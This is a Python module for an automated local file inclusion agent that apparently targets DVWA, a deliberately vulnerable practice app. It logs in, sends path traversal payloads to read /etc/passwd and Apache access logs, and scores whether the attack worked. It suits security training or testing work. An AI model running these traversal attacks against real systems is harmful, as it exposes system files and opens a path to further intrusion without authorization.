"""Tier 2 local file inclusion agent."""

from __future__ import annotations

from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import (
    already_tried_payloads,
    append_error_marker,
    make_update,
    module_endpoint,
    normalize_security_level,
    prepare_agent_session,
)
from core.state import ExploitationState
from foundation.http_client import RequestTimeoutError, TransportError
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier


PASSWD_SIGNALS = ["root:x:0:0", "daemon:", "/bin/bash", "/bin/sh"]
LOG_SIGNALS = ["GET /", "POST /", "HTTP/1."]


class LFIAgent(BaseAgent):
    module_name = "lfi"

    def __init__(self) -> None:
        self.payloads = PayloadLibrary()
        self.verifier = Verifier()

    def check_prerequisites(self, state: ExploitationState) -> bool:
        return True

    def run(self, state: ExploitationState) -> dict[str, Any]:
        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/fi/")
        payload_set = self.payloads.get(self.module_name, level)
        already_tried = already_tried_payloads(state, self.module_name)

        score = 0
        confirmed: list[str] = []
        tried_now: list[str] = []

        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        lfi_payloads = (
            list(payload_set.probe)
            + list(payload_set.bypass.get(level, []))
            + ["../../../../../../etc/passwd"]
        )
        log_payloads = [
            "../../../../../../var/log/apache2/access.log",
            "../../../var/log/apache2/access.log",
        ]

        session = DVWASession(target_url)
        try:
            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
            tried_now.extend(prep_notes)
            if not ready:
                return make_update(
                    state=state,
                    module_name=self.module_name,
                    score=score,
                    tried_payloads=tried_now,
                )

            for payload in lfi_payloads:
                if payload in already_tried:
                    continue
                tried_now.append(payload)
                response = session.get(endpoint, params={"page": payload})
                body = response.text or ""

                if self.verifier.contains_any(body, PASSWD_SIGNALS).ok:
                    score = max(score, 3)
                    if "lfi_confirmed" not in confirmed:
                        confirmed.append("lfi_confirmed")
                    break
                if "../" in payload and body:
                    score = max(score, 1)

            if "lfi_confirmed" in confirmed:
                for log_payload in log_payloads:
                    if log_payload in already_tried:
                        continue
                    tried_now.append(log_payload)
                    response = session.get(endpoint, params={"page": log_payload})
                    body = response.text or ""
                    if self.verifier.contains_any(body, LOG_SIGNALS).ok:
                        score = 4
                        if "log_access_confirmed" not in confirmed:
                            confirmed.append("log_access_confirmed")
                        break
        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
            append_error_marker(tried_now, "lfi_runtime_error", exc)
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
        )


_AGENT = LFIAgent()


def lfi_agent(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
